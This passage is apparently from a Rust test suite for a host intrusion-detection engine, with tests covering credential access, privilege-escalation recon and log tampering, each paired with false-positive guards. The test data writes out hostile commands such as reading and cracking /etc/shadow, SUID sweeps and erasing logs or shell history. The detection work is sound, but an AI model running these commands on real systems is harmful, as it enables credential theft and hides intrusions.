    fn detects_passwd_write() {
        let d = classify_persistence("/etc/passwd").expect("must detect");
        assert_eq!(d.rule_id, PASSWD_SHADOW_PERSISTENCE_RULE_ID);
    }

    #[test]
    fn benign_file_write_is_never_flagged() {
        let benign = ["/home/user/notes.txt", "/var/www/html/index.html", "/opt/app/data.db", "/home/user/project/main.rs"];
        for p in benign {
            assert!(classify_persistence(p).is_none(), "false positive on benign path: {p}");
        }
    }

    // ---- 2026-07-07 coverage extension: credential access (T1003.008) --------------------------

    #[test]
    fn detects_cat_on_etc_shadow() {
        let dets = classify_exec("cat", "cat /etc/shadow", Some("bash"), &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, CREDENTIAL_ACCESS_SHADOW_RULE_ID);
        assert_eq!(dets[0].mitre, "T1003.008");
    }

    #[test]
    fn detects_unshadow_combo_attack() {
        let dets = classify_exec("unshadow", "unshadow /etc/passwd /etc/shadow", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, CREDENTIAL_ACCESS_SHADOW_RULE_ID);
    }

    #[test]
    fn detects_john_against_shadow_combo_file() {
        let dets = classify_exec("john", "john /tmp/shadow_combined.txt", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, CREDENTIAL_ACCESS_SHADOW_RULE_ID);
    }

    // FP guard: the passwd/PAM toolchain itself must never fire even if — unusually — its argv
    // happens to spell out the path (the common case: `passwd`/`chage`/`sshd` never carry the
    // literal path at all, since they resolve it internally; this proves the allowlist guard also
    // holds for the rarer case where it's spelled out, e.g. a manual `vipw -s` edit).
    #[test]
    fn passwd_pam_toolchain_touching_shadow_path_is_not_flagged() {
        for (name, cmd) in [
            ("vipw", "vipw -s /etc/shadow"),
            ("pwck", "pwck /etc/passwd /etc/shadow"),
            ("chage", "chage -l root"), // does not even reference the path — must not fire either
        ] {
            let dets = classify_exec(name, cmd, None, &cfg());
            assert!(dets.is_empty(), "false positive on legit passwd/PAM toolchain: {name} {cmd}");
        }
    }

    // FP guard: a benign read of /etc/passwd (no shadow file involved) must never fire.
    #[test]
    fn cat_on_etc_passwd_alone_is_not_flagged() {
        let dets = classify_exec("cat", "cat /etc/passwd", Some("bash"), &cfg());
        assert!(dets.is_empty());
    }

    #[test]
    fn shadow_tool_allowlist_is_env_tunable() {
        let mut c = cfg();
        c.shadow_tool_allowlist = vec!["mybackuptool".to_string()];
        let dets = classify_exec("mybackuptool", "mybackuptool --archive /etc/shadow", None, &c);
        assert!(dets.is_empty(), "an operator-allowlisted backup tool must not fire");
    }

    // ---- 2026-07-07 coverage extension: privilege-escalation recon (T1548.003) -----------------

    #[test]
    fn detects_sudo_l_enumeration() {
        let dets = classify_exec("sudo", "sudo -l", Some("bash"), &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, PRIVESC_RECON_RULE_ID);
        assert_eq!(dets[0].mitre, "T1548.003");
    }

    #[test]
    fn detects_suid_enumeration_sweep() {
        let dets = classify_exec("find", "find / -perm -4000 -type f 2>/dev/null", Some("bash"), &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, PRIVESC_RECON_RULE_ID);
    }

    #[test]
    fn detects_bare_pkexec_pwnkit_ioc() {
        let dets = classify_exec("pkexec", "pkexec", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, PRIVESC_RECON_RULE_ID);
        assert_eq!(dets[0].severity, SEV_HIGH, "the PwnKit IOC is HIGH, not just MEDIUM like a bare sudo -l");
    }

    // FP guard: a normal pkexec invocation with a real target command must never fire.
    #[test]
    fn normal_pkexec_invocation_with_target_command_is_not_flagged() {
        let dets = classify_exec("pkexec", "pkexec /usr/bin/synaptic", None, &cfg());
        assert!(dets.is_empty());
    }

    // FP guard: a normal `find` for files (no -perm -4000/-6000) must never fire.
    #[test]
    fn ordinary_find_is_not_flagged() {
        let dets = classify_exec("find", "find /home/user -name '*.txt'", Some("bash"), &cfg());
        assert!(dets.is_empty());
    }

    // FP guard: config-management automation's routine `sudo -l` bootstrap probe is allowlisted by
    // PARENT process name.
    #[test]
    fn config_management_sudo_l_probe_is_allowlisted() {
        let dets = classify_exec("sudo", "sudo -l", Some("ansible-playbook"), &cfg());
        assert!(dets.is_empty(), "ansible's routine become-check must not be flagged");
    }

    #[test]
    fn privesc_allowlist_is_env_tunable() {
        let mut c = cfg();
        c.privesc_recon_allowlist = vec!["myorchestrator".to_string()];
        let dets = classify_exec("sudo", "sudo -l", Some("myorchestrator"), &c);
        assert!(dets.is_empty());
    }

    // ---- 2026-07-07 coverage extension: defense evasion / log-tampering (T1070) ----------------

    #[test]
    fn detects_rm_on_var_log() {
        let dets = classify_exec("rm", "rm -f /var/log/auth.log", Some("bash"), &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, LOG_TAMPERING_RULE_ID);
        assert_eq!(dets[0].mitre, "T1070");
    }

    #[test]
    fn detects_truncate_on_var_log() {
        let dets = classify_exec("truncate", "truncate -s 0 /var/log/syslog", Some("bash"), &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, LOG_TAMPERING_RULE_ID);
    }

    #[test]
    fn detects_redirect_onto_var_log() {
        let dets = classify_exec("bash", "bash -c \"echo > /var/log/auth.log\"", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, LOG_TAMPERING_RULE_ID);
    }

    #[test]
    fn detects_history_dash_c() {
        let dets = classify_exec("bash", "bash -c \"history -c\"", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, LOG_TAMPERING_RULE_ID);
    }

    #[test]
    fn detects_unset_histfile() {
        let dets = classify_exec("bash", "bash -c \"unset HISTFILE\"", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, LOG_TAMPERING_RULE_ID);
    }

    // FP guard: logrotate/journalctl/the systemd-journal toolchain truncating/rotating logs AS
    // THEIR DESIGNED JOB must never fire, even though the action is otherwise identical.
    #[test]
    fn logrotate_and_journal_toolchain_truncating_logs_is_not_flagged() {
        for (name, cmd) in [
            ("logrotate", "/usr/sbin/logrotate /etc/logrotate.conf"),
            ("journalctl", "journalctl --vacuum-time=2d"),
            ("systemd-tmpfiles", "systemd-tmpfiles --clean"),
        ] {
            let dets = classify_exec(name, cmd, None, &cfg());
            assert!(dets.is_empty(), "false positive on legit log toolchain: {name} {cmd}");
        }
    }

    // FP guard: reading a log file (no destructive verb) must never fire.
    #[test]
    fn reading_a_log_file_is_not_flagged() {
        let dets = classify_exec("tail", "tail -f /var/log/syslog", Some("bash"), &cfg());
        assert!(dets.is_empty());
    }

    #[test]
    fn log_tool_allowlist_is_env_tunable() {
        let mut c = cfg();
        c.log_tool_allowlist = vec!["mylogmanager".to_string()];
        let dets = classify_exec("mylogmanager", "mylogmanager truncate /var/log/app.log", None, &c);
        assert!(dets.is_empty());
    }

    // ---- rule_id collision guard: the new 2026-07-07 additions must not collide with the existing
    // host-EDR band or with each other -------------------------------------------------------------
    #[test]
    fn new_2026_07_07_rule_ids_do_not_collide() {
        let all = [
            REVERSE_SHELL_RULE_ID,
            DOWNLOAD_EXEC_RULE_ID,
            SUSPICIOUS_PARENTAGE_RULE_ID,
            EXEC_FROM_WRITABLE_PATH_RULE_ID,
            CRON_PERSISTENCE_RULE_ID,
            SYSTEMD_PERSISTENCE_RULE_ID,
            SSH_AUTHKEYS_PERSISTENCE_RULE_ID,
            LD_PRELOAD_PERSISTENCE_RULE_ID,
            SHELL_PROFILE_PERSISTENCE_RULE_ID,
            PASSWD_SHADOW_PERSISTENCE_RULE_ID,
            CREDENTIAL_ACCESS_SHADOW_RULE_ID,
            PRIVESC_RECON_RULE_ID,
            LOG_TAMPERING_RULE_ID,
        ];
        for i in 0..all.len() {
            for j in (i + 1)..all.len() {
                assert_ne!(all[i], all[j], "rule_id collision between index {i} and {j}");
            }
        }
    }
}
